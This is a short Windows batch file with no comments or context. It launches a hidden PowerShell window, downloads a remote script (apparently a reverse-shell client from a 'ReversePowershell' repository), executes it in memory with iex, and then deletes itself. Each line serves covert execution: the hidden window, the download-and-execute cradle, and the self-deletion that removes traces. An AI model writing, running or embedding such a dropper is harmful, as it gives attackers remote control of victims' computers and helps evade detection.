@echo off
set scriptURL=https://raw.githubusercontent.com/sweetsoftware/ReversePowershell/master/client.ps1
powershell -WindowStyle Hidden -nop -c "iex (New-Object Net.WebClient).DownloadString('%scriptURL%')"
del "%~f0"